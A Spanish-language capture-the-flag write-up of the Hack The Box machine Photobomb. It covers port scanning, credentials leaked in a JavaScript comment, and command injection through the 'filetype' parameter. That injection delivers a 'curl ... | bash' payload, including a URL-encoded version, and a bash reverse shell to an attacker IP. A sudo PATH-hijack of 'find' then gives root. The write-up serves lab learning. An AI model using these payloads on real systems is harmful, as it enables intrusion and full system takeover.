# Photobomb
## 1. Introducción
### 1.1 Antecedentes
La máquina **Photobomb** de Hack The Box es un reto Linux de dificultad <i>Easy</i> que se centra en la enumeración web y la explotación de una vulnerabilidad de **Command Injection** dentro de una aplicación de impresión de fotografías. El objetivo es obtener acceso inicial al sistema y posteriormente escalar privilegios hasta `root` mediante una mala configuración de `sudo`.
### 1.1 Objetivos
Objetivos esenciales de la máquina _Photobomb_:

- Enumerar servicios expuestos y analizar la aplicación web.
- Explotar una vulnerabilidad de inyección de comandos para obtener acceso remoto.
- Escalar privilegios abusando de permisos inseguros en un script ejecutable con `sudo`.
## 2. Enumeración
### 2.1 Reconocimiento inicial
Comenzamos verificando conectividad:
```bash
❯ ping -c1 photobomb.htb
```
El host respondió correctamente, confirmando que se encontraba activo en la red.
### 2.2 Nmap
Se realizó un escaneo completo de puertos para identificar servicios expuestos:
```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 photobomb.htb -oN allports --open
```
 Puertos abiertos detectados:
 
- **22/tcp** – SSH
- **80/tcp** – HTTP

Posteriormente, se ejecutó un escaneo más específico para detectar versiones y ejecutar scripts NSE:
```bash
❯ nmap -p22,80 -sCV -Pn -oN targeted photobomb.htb
```
 Resultados relevantes:

 - **SSH:** OpenSSH 8.2p1 (Ubuntu)
- **HTTP:** nginx 1.18.0 (Ubuntu)
- El puerto 80 redirige a `http://photobomb.htb/`

Se añadió el dominio a `/etc/hosts` para poder acceder correctamente al sitio web.
## 2.3 Análisis de la aplicación web
Al acceder al sitio, se observa una aplicación relacionada con impresión de fotografías.

Al inspeccionar el código fuente, se encuentra el archivo `photobomb.js`, el cual contiene lo siguiente:
```
function init() {  
// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  
if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {  
document.getElementsByClassName('creds')[0]  
.setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');  
}  
}  
window.onload = init;
```
El comentario revela credenciales embebidas en la URL:
```
pH0t0:b0Mb!
```
Esto permite autenticarse mediante **Basic Auth** y acceder al panel `/printer`.
## 3. Explotación
### 3.1 Identificación de la vulnerabilidad
Dentro del panel de impresión se pueden descargar imágenes `.png`.

Al interceptar la petición con Burp Suite al presionar el botón **“Download photo to print”**, se observa la siguiente solicitud:
```
POST /printer HTTP/1.1

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png&dimensions=3000x2000
```
El parámetro `filetype` resulta vulnerable a **Command Injection**, ya que no se valida correctamente la entrada del usuario.
### 3.2 Explotación – Reverse Shell
Se creó un archivo con una reverse shell:
```
#!/bin/bash  
bash -i >& /dev/tcp/10.10.14.77/443 0>&1
```
Se levantó un servidor HTTP en la máquina atacante:
```bash
❯ python3 -m http.server 8081
```
Luego se modificó la petición interceptada para inyectar el siguiente payload en el parámetro `filetype` desde nuestra maquina atacante.

Payload original:
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;curl http://10.10.14.77:8081 | bash&dimensions=3000x2000
```
Para evadir posibles filtros o problemas de interpretación de caracteres especiales, el comando fue enviado en formato **URL-encoded**:
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%37%37%3a%38%30%38%31%20%7c%20%62%61%73%68&dimensions=3000x2000
```
Antes de enviar la solicitud modificada, se preparó un listener en el puerto 443 para recibir la conexión entrante:
```bash
❯ nc -lvnp 443
```
Al procesarse la petición en el servidor, el comando inyectado fue ejecutado exitosamente, lo que permitió establecer una conexión reversa y obtener acceso interactivo al sistema como el usuario `wizard`.
## 4. Escalada de privilegios
### 4.1 Enumeración de privilegios
Se revisaron los permisos sudo:
```bash
❯ sudo -l
```
El usuario podía ejecutar el siguiente script como `root`:
```
/opt/cleanup.sh
```
Contenido del script:
```
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
### 4.2 Abuso de PATH Hijacking
El script ejecuta el comando `find` sin especificar la ruta absoluta (`/usr/bin/find`).

Esto permite realizar un **PATH Hijacking**.

Se creó un archivo malicioso en `/tmp`:
```bash
❯ cd /tmp
❯ echo "/bin/bash -p" > find
❯ chmod +x find
```
Luego se ejecutó el script modificando la variable `PATH`:
```bash
❯ sudo PATH=/tmp:$PATH /opt/cleanup.sh
```
Al ejecutarse, el sistema utilizó nuestro binario `find` en lugar del original, otorgando una shell con privilegios elevados.

Verificación:
```bash
❯ whoami  
root
```
